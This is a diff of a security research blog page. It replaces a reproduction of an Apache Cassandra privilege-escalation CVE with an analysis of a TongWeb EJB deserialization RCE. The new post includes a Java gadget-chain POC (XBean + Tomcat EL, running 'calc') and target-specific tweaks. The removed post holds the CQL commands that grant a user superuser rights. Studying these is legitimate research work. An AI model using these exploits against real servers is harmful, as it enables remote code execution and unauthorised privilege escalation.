@@ -123,7 +123,7 @@
     
     <!--- Seo Part-->
     
-    <link rel="canonical" href="http://example.com/2025/09/22/cve-2025-26467/"/>
+    <link rel="canonical" href="http://example.com/2025/11/20/tongweb ejb 反序列化漏洞分析/"/>
     <meta name="robots" content="index,follow">
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
@@ -131,16 +131,16 @@
     
     
         
-        <meta name="description" content="Apache Cassandra: User with MODIFY permission on ALL KEYSPACES can escalate privileges to superuser via unsafe actions (4.0.16 only)  项目地址： https:&#x2F;&#x2F;github.com&#x2F;apache&#x2F;cassandra 漏洞版本： https:&#x2F;&#x2F;github.co">
+        <meta name="description" content="漏洞分析反序列化分析从官网下载补丁升级说明 : TongWeb应用服务器关闭web应用端口EJB服务补丁  可以看到存在漏洞的接口是 ejbserver&#x2F;ejb :   反编译所有的 Jar 包 , 全局搜索相关接口 :   根据第 34 行 , 我们可以定位到该 Servlet 位于 com.tongweb.tongejb.server.httpd.ServerServlet   在它的 ser">
 <meta property="og:type" content="article">
-<meta property="og:title" content="CVE-2025-26467 复现记录">
-<meta property="og:url" content="http://example.com/2025/09/22/CVE-2025-26467/index.html">
+<meta property="og:title" content="TongWeb EJB 反序列化漏洞分析">
+<meta property="og:url" content="http://example.com/2025/11/20/TongWeb%20EJB%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/index.html">
 <meta property="og:site_name" content="exp3n5ive&#39; Blog">
-<meta property="og:description" content="Apache Cassandra: User with MODIFY permission on ALL KEYSPACES can escalate privileges to superuser via unsafe actions (4.0.16 only)  项目地址： https:&#x2F;&#x2F;github.com&#x2F;apache&#x2F;cassandra 漏洞版本： https:&#x2F;&#x2F;github.co">
+<meta property="og:description" content="漏洞分析反序列化分析从官网下载补丁升级说明 : TongWeb应用服务器关闭web应用端口EJB服务补丁  可以看到存在漏洞的接口是 ejbserver&#x2F;ejb :   反编译所有的 Jar 包 , 全局搜索相关接口 :   根据第 34 行 , 我们可以定位到该 Servlet 位于 com.tongweb.tongejb.server.httpd.ServerServlet   在它的 ser">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://example.com/images/redefine-og.webp">
-<meta property="article:published_time" content="2025-09-21T23:55:25.375Z">
-<meta property="article:modified_time" content="2025-09-24T07:19:39.220Z">
+<meta property="article:published_time" content="2025-11-20T09:55:26.252Z">
+<meta property="article:modified_time" content="2025-11-20T09:56:52.090Z">
 <meta property="article:author" content="exp3n5ive">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://example.com/images/redefine-og.webp">
@@ -155,7 +155,7 @@
     
     <title>
         
-            CVE-2025-26467 复现记录 | exp3n5ive&#39; Blog
+            TongWeb EJB 反序列化漏洞分析 | exp3n5ive&#39; Blog
         
     </title>
 
@@ -381,7 +381,7 @@
 		<div class="article-title relative w-full">
 			
 			<div class="w-full flex items-center pt-6 justify-start">
-				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">CVE-2025-26467 复现记录</h1>
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">TongWeb EJB 反序列化漏洞分析</h1>
 			</div>
 			
 		</div>
@@ -402,15 +402,15 @@
 					<div class="article-meta-info">
     <span class="article-date article-meta-item">
         <i class="fa-regular fa-pen-fancy"></i>&nbsp;
-        <span class="desktop">2025-09-22 07:55:25</span>
-        <span class="mobile">2025-09-22 07:55:25</span>
+        <span class="desktop">2025-11-20 17:55:26</span>
+        <span class="mobile">2025-11-20 17:55:26</span>
         <span class="hover-info">Created</span>
     </span>
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2025-09-24 15:19:39</span>
-            <span class="mobile">2025-09-24 15:19:39</span>
+            <span class="desktop">2025-11-20 17:56:52</span>
+            <span class="mobile">2025-11-20 17:56:52</span>
             <span class="hover-info">Updated</span>
         </span>
     
@@ -424,7 +424,7 @@
                     
                         
                         <li>
-                            <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a>&nbsp;
+                            <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>&nbsp;
                         </li>
                     
                     
@@ -437,12 +437,12 @@
     
     
         <span class="article-wordcount article-meta-item">
-            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>502 Words</span>
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>810 Words</span>
         </span>
     
     
         <span class="article-min2read article-meta-item">
-            <i class="fa-regular fa-clock"></i>&nbsp;<span>2 Mins</span>
+            <i class="fa-regular fa-clock"></i>&nbsp;<span>3 Mins</span>
         </span>
     
     
@@ -461,95 +461,138 @@
 
 
 		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
-			<blockquote>
-<p><strong>Apache Cassandra: User with MODIFY permission on ALL KEYSPACES can escalate privileges to superuser via unsafe actions (4.0.16 only)</strong></p>
-</blockquote>
-<p>项目地址： <a class="link"   target="_blank" rel="noopener" href="https://github.com/apache/cassandra" >https://github.com/apache/cassandra<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
-<p>漏洞版本： <a class="link"   target="_blank" rel="noopener" href="https://github.com/apache/cassandra/releases/tag/cassandra-4.0.16" >https://github.com/apache/cassandra/releases/tag/cassandra-4.0.16<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
-<p>文章地址： <a class="link"   target="_blank" rel="noopener" href="https://github.com/advisories/GHSA-5c4f-pxmx-xcm4" >https://github.com/advisories/GHSA-5c4f-pxmx-xcm4<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
-<p>权限相关官方文档： <a class="link"   target="_blank" rel="noopener" href="https://cassandra.apache.org/doc/4.0/cassandra/cql/security.html" >https://cassandra.apache.org/doc/4.0/cassandra/cql/security.html<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+			<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="反序列化分析"><a href="#反序列化分析" class="headerlink" title="反序列化分析"></a>反序列化分析</h2><p>从官网下载补丁升级说明 : <a class="link"   target="_blank" rel="noopener" href="https://www.tongtech.com/dft/downloads/128.html" >TongWeb应用服务器关闭web应用端口EJB服务补丁<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> </p>
+<p>可以看到存在漏洞的接口是 <code>ejbserver/ejb</code> : </p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://exp3n5ive.github.io/2025/11/20/TongWeb%20EJB%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/images/1763632462628-9b794d69-4877-4c08-ac49-d8fd345ce0d4.png"
+                     
+                ></p>
+<p>反编译所有的 Jar 包 , 全局搜索相关接口 : </p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://exp3n5ive.github.io/2025/11/20/TongWeb%20EJB%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/images/1763632462724-f34a529d-0525-4d22-850c-b1f46d2a1b21.png"
+                     
+                ></p>
+<p>根据第 34 行 , 我们可以定位到该 Servlet 位于 <code>com.tongweb.tongejb.server.httpd.ServerServlet</code> </p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://exp3n5ive.github.io/2025/11/20/TongWeb%20EJB%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/images/1763632462907-a24fe2d9-2854-4d43-8729-c704120d0c61.png"
+                     
+                ></p>
+<p>在它的 service 方法中接收了 POST 数据 , 并进一步调用了 <code>this.ejbServer.service</code> 进行处理 , 跟进 : </p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://exp3n5ive.github.io/2025/11/20/TongWeb%20EJB%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/images/1763619712315-847b404d-4dfd-4809-8fd0-37ee9837112f.png"
+                     
+                ></p>
+<p>100 行再次调用其他方法 , 继续跟 : </p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://exp3n5ive.github.io/2025/11/20/TongWeb%20EJB%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/images/1763632463011-b73b9582-33c6-426c-9d09-a9e7360d8006.png"
+                     
+                ></p>
+<p>首先是对输入流进行了简单封装 , 然后先调用了 <code>clientProtocol.readExternal(cis);</code> 进行处理 : </p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://exp3n5ive.github.io/2025/11/20/TongWeb%20EJB%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/images/1763632463087-e604515c-da3b-489f-be00-effec39ebd6e.png"
+                     
+                ></p>
+<p>这里读取了输入流的前八个字节 , 然后调用 init 方法 : </p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://exp3n5ive.github.io/2025/11/20/TongWeb%20EJB%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/images/1763632463166-9f72d144-c7ea-414d-9a5a-2d37e6e1caa9.png"
+                     
+                ></p>
+<p>这里要求八个字节必须满足 <code>W3EP/X.Y</code> 的格式 ( X、Y为单个数字 ) </p>
+<p>回到刚才的 service 方法 , 接着又调用了 <code>serverMetaData.readExternal(ois);</code> , 在这里进行了反序列化操作 : </p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://exp3n5ive.github.io/2025/11/20/TongWeb%20EJB%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/images/1763632463255-aca48932-9232-499d-8bad-9a64712e7799.png"
+                     
+                ></p>
+<p>注意这里在反序列化前先调用了 <code>readByte</code> , 所以我们序列化时要先 <code>writeByte</code> </p>
 <hr>
+<h2 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h2><p>看别人的文章说该项目存在 <code>commons-beanutils</code> 依赖 , 但是没有 <code>BeanComparator</code> 类 , 所以打不了 CB 链</p>
+<p>但是我反编译的代码里面是有这个类的 , 不知道是不是因为我的源码版本比较低……</p>
+<p>同时看到公开的 POC 中的序列化数据 : </p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://exp3n5ive.github.io/2025/09/12/CVE-2025-26467/images/1756276198824-19ffcf66-942e-4a19-bcbd-c646dbaa0a9e.png"
+                     data-src="https://exp3n5ive.github.io/2025/11/20/TongWeb%20EJB%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/images/1763632463338-1aa779b5-43c0-4104-b369-064cae162168.png"
                      
                 ></p>
-<p>猜测这个漏洞可能和 CVE-2025-23015 有点关系，于是搜索 CVE-2025-23015，在 <a class="link"   target="_blank" rel="noopener" href="https://www.instaclustr.com/support/documentation/announcements/apache-cassandra/security-advisory-for-apache-cassandra-vulnerabilities-cve-2025-23015-cve-2025-24860-and-cve-2024-27137/" >Security Advisory for Apache Cassandra Vulnerabilities - CVE-2025-23015, CVE-2025-24860, and CVE-2024-27137 - Instaclustr<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 看到</p>
+<p>看来是打 <code>XBean + Tomcat EL</code> 链了 , 之前没学过这个链子 , 正好学习一下</p>
+<p>这条链子可以用 java-chains 生成 : </p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://exp3n5ive.github.io/2025/09/12/CVE-2025-26467/images/1756276298436-f1e1f952-5a6c-4088-a025-9ab753d25048.png"
+                     data-src="https://exp3n5ive.github.io/2025/11/20/TongWeb%20EJB%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/images/1763632463456-15da9d74-aef1-4594-b0cd-8f2d85506701.png"
                      
                 ></p>
-<p>利用方式是修改 system_auth ，这个是用来处理用户凭据、角色和权限、权限分配的。</p>
-<p>这样看的话，如果一个用户拥有 ALL KEYSPACES 的修改权限，那么可以通过修改 system_auth 来提权好像就挺合理的。</p>
-<hr>
-<p>对比两个版本的代码 <a class="link"   target="_blank" rel="noopener" href="https://github.com/apache/cassandra/compare/cassandra-4.0.16...cassandra-4.0.17" >https://github.com/apache/cassandra/compare/cassandra-4.0.16...cassandra-4.0.17<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>，发现在新一版的 <a target="_blank" rel="noopener" href="https://github.com/apache/cassandra/compare/cassandra-4.0.16...cassandra-4.0.17#diff-050b0e261bb49fb355ab71b5fd066b79dd6c5600ffecb91ffb2d4dabca76a87b"><font style="color:rgb(240, 246, 252) !important;">src&#x2F;java&#x2F;org&#x2F;apache&#x2F;cassandra&#x2F;service&#x2F;ClientState.java</font></a> 中增加了下面的内容：</p>
+<p>但是该系统将 <code>xbean-naming</code> 的包名给修改了 , 而且还要在序列化数据中添加一些字节 , 所以这里选择重新手搓</p>
+<p>这条链的 Source 是 <code>BadAttributeValueExpException.readObject()</code> , 经典的 <code>readObject -&gt; toString</code> : </p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://exp3n5ive.github.io/2025/09/12/CVE-2025-26467/images/1756309684243-3a1c955b-b8e0-4aac-8041-378c38dae742.png"
+                     data-src="https://exp3n5ive.github.io/2025/11/20/TongWeb%20EJB%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/images/1763632463527-d5b0bcd7-ea58-40fc-a5b0-c841b512132b.png"
                      
                 ></p>
-<p>从注释可以了解到：即使一个用户拥有 ALL KEYSPACES 权限，这个权限也不应该自动扩展到系统 keyspace（包括 system_auth）。系统 keyspace 的访问需要显式授权，并且有更严格的权限限制（在 Permission 枚举中定义）。</p>
-<hr>
-<p>可以模仿 test&#x2F;unit&#x2F;org&#x2F;apache&#x2F;cassandra&#x2F;auth&#x2F;GrantAndRevokeTest.java 里的语句来做 exp</p>
+<p>接着调用 <code>javax.naming.Binding#toString</code> : </p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://exp3n5ive.github.io/2025/09/12/CVE-2025-26467/images/1756372171649-a2d95dc1-0d9a-437a-9881-c6b38ce48da6.png"
+                     data-src="https://exp3n5ive.github.io/2025/11/20/TongWeb%20EJB%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/images/1763632463594-04cec3f5-f756-4fc2-801e-738c04d6b31c.png"
                      
                 ></p>
-<hr>
-<p><strong>复现过程</strong></p>
-<p>1、用 docker 起一个 4.0.16 的 cassandra，进入容器安装 vim，将 &#x2F;etc&#x2F;cassandra&#x2F;cassandra.yaml 中的 AllowAllAuthenticator 改成 PasswordAuthenticator，AllowAllAuthorizer 改成  CassandraAuthorizer  ，然后用密码登录（cassandra:cassandra）：</p>
+<p>接着来到子类的 <code>getObject()</code> : <code>org.apache.xbean.naming.context.ContextUtil.ReadOnlyBinding#getObject</code> </p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://exp3n5ive.github.io/2025/09/12/CVE-2025-26467/images/1756372098063-4318294a-10e7-4089-8017-5025ee143ec7.png"
+                     data-src="https://exp3n5ive.github.io/2025/11/20/TongWeb%20EJB%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/images/1763632463659-b4ae8936-5040-4397-bf46-a16a5d60040d.png"
                      
                 ></p>
-<p>2、新建一个用户并授予权限：</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CREATE ROLE test_user WITH LOGIN = TRUE AND password=&#x27;pass&#x27;;</span><br><span class="line">GRANT MODIFY ON ALL KEYSPACES TO test_user;</span><br></pre></td></tr></table></figure></div>
+<p>跟进 <code>resolve</code> : </p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://exp3n5ive.github.io/2025/11/20/TongWeb%20EJB%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/images/1763632463744-667f5fec-db0b-4995-8a0a-d66f3b718e3d.png"
+                     
+                ></p>
+<p>这里会发现 <code>value</code> 是个 <code>Reference</code> 对象 , 并且我们可控 , 所以我们可以准备一个恶意引用 , 去加载 <code>javax.el.ELProcessor</code> 从而执行 EL 来 RCE</p>
+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;</span><br><span class="line"><span class="keyword">import</span> org.apache.xbean.naming.context.ContextUtil;</span><br><span class="line"><span class="keyword">import</span> org.apache.xbean.naming.context.WritableContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">POC</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">ELString</span> <span class="operator">=</span> <span class="string">&quot;Runtime.getRuntime().exec(&#x27;calc&#x27;)&quot;</span>;</span><br><span class="line">        <span class="type">ResourceRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;javax.el.ELProcessor&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="literal">true</span>, <span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;x=eval&quot;</span>));</span><br><span class="line">        ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;x&quot;</span>, ELString));</span><br><span class="line"></span><br><span class="line">        <span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> (Context) ReflectUtil.newInstanceWithoutConstructor(WritableContext.class);</span><br><span class="line">        ContextUtil.<span class="type">ReadOnlyBinding</span> <span class="variable">binding</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ContextUtil</span>.ReadOnlyBinding(<span class="string">&quot;Evil&quot;</span>, ref, ctx);</span><br><span class="line">        ReflectUtil.setFieldValue(binding, <span class="string">&quot;boundObj&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">bave</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        ReflectUtil.setFieldValue(bave, <span class="string">&quot;val&quot;</span>, binding);</span><br><span class="line">        SerializeUtil.test(bave);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
 
+<p>有个坑点 : </p>
+<p>我们实例化 <code>ReadOnlyBinding</code> 的时候需要传入一个 Context , 而实例化 <code>WritableContext</code> 需要传入一个 <code>ContextAccess.MODIFIABLE</code> : </p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://exp3n5ive.github.io/2025/09/12/CVE-2025-26467/images/1756395411595-8bfbac1b-c1f8-49c3-a9bb-fcc402c4614d.png"
+                     data-src="https://exp3n5ive.github.io/2025/11/20/TongWeb%20EJB%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/images/1763632463865-02a92cab-a8bd-4fc6-a2f6-da3398acb5e0.png"
                      
                 ></p>
-<p>3、切换测试用户登录，修改 system_auth.roles 表</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE system_auth.roles SET is_superuser = True WHERE role = &#x27;test_user&#x27;;</span><br></pre></td></tr></table></figure></div>
-
+<p>但是这个接口不能序列化 : </p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://exp3n5ive.github.io/2025/09/12/CVE-2025-26467/images/1756397972986-41ad130f-35b6-4278-a7f0-c63894128879.png"
+                     data-src="https://exp3n5ive.github.io/2025/11/20/TongWeb%20EJB%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/images/1763632463939-90357b72-562d-4917-94af-49dee6202ff1.png"
                      
                 ></p>
-<p>可以看到，在修改之前是没有权限执行 <code>LIST ALL PERMISSIONS;</code> 等命令的：</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://exp3n5ive.github.io/2025/09/12/CVE-2025-26467/images/1756398065562-b8b2660b-9921-4463-a374-ff2012b3ecfa.png"
-                     
-                ></p>
-<p>修改后就都能执行了：</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://exp3n5ive.github.io/2025/09/12/CVE-2025-26467/images/1756398203330-12676c76-2fe1-442e-9b4c-27d2dbc37ac9.png"
-                     
-                ></p>
-<p>4、用相同操作对 4.0.17 进行测试：</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://exp3n5ive.github.io/2025/09/12/CVE-2025-26467/images/1756399522007-9ffdc8d2-32fd-4579-991e-244400ca16ec.png"
-                     
-                ></p>
-<p>执行失败。并且发现 cassandra 的权限管理也细化了</p>
+<p>所以可以通过 <code>newConstructorForSerialization</code> 绕过构造器直接实例化</p>
+<p>最后注意生成这个系统的 POC 的话还需要进行 <code>writeByte</code> 以及改包名</p>
+<hr>
+<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a class="link"   target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/SThL617Eo5EVLrf5hu7dmw" >【原创0day】东方通应用服务器 EJB 反序列化远程代码执行漏洞安全通告<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> </p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/yM59arQR115Wo43BW9UZRQ" >TongWeb最新反序列化漏洞分析<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> </p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://www.tongtech.com/newsDetail.html?id=102461" >有关TongWeb应用服务器产品安全加固说明<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> </p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://www.tongtech.com/dft/download.html" >东方通产品漏洞处置和安全加固流程软件下载<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> </p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/Jw-TQd2u64_BmNISvNgUug" >XBean + Tomcat EL 链分析<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
 
 		</div>
 
@@ -557,18 +600,18 @@
 		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
 			<div class="article-copyright-info-container">
     <ul>
-        <li><strong>Title:</strong> CVE-2025-26467 复现记录</li>
+        <li><strong>Title:</strong> TongWeb EJB 反序列化漏洞分析</li>
         <li><strong>Author:</strong> exp3n5ive</li>
         <li><strong>Created at
-                :</strong> 2025-09-22 07:55:25</li>
+                :</strong> 2025-11-20 17:55:26</li>
         
             <li>
                 <strong>Updated at
-                    :</strong> 2025-09-24 15:19:39
+                    :</strong> 2025-11-20 17:56:52
             </li>
         
         <li>
-            <strong>Link:</strong> https://exp3n5ive.github.io/2025/09/22/CVE-2025-26467/
+            <strong>Link:</strong> https://exp3n5ive.github.io/2025/11/20/TongWeb EJB 反序列化漏洞分析/
         </li>
         <li>
             <strong>
@@ -593,23 +636,11 @@
 		
 		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
 			
-			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
-				<a class="prev" rel="prev" href="/2025/09/22/Jdk17&amp;CC%20%E4%B8%8B%E5%88%A9%E7%94%A8%20TemplesImpl/">
-					<span class="left arrow-icon flex justify-center items-center">
-						<i class="fa-solid fa-chevron-left"></i>
-					</span>
-					<span class="title flex justify-center items-center">
-						<span class="post-nav-title-item truncate max-w-48">Jdk17&amp;CC 下利用 TemplesImpl</span>
-						<span class="post-nav-item">Prev posts</span>
-					</span>
-				</a>
-			</div>
-			
 			
 			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
-				<a class="next" rel="next" href="/2025/09/22/Java%20%E5%86%85%E5%AD%98%E9%A9%AC/">
+				<a class="next" rel="next" href="/2025/11/16/Thymeleaf%20SSTI%20%E5%88%86%E6%9E%90/">
 					<span class="title flex justify-center items-center">
-						<span class="post-nav-title-item truncate max-w-48">Java 内存马</span>
+						<span class="post-nav-title-item truncate max-w-48">Thymeleaf SSTI 分析</span>
 						<span class="post-nav-item">Next posts</span>
 					</span>
 					<span class="right arrow-icon flex justify-center items-center">
@@ -671,8 +702,8 @@
 		<div class="post-toc-wrap">
 	<div class="post-toc">
 		<div class="toc-title">On this page</div>
-		<div class="page-title">CVE-2025-26467 复现记录</div>
-		
+		<div class="page-title">TongWeb EJB 反序列化漏洞分析</div>
+		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-text">漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90"><span class="nav-text">反序列化分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90"><span class="nav-text">利用链分析</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Reference"><span class="nav-text">Reference</span></a></li></ol>
 
 	</div>
 </div>
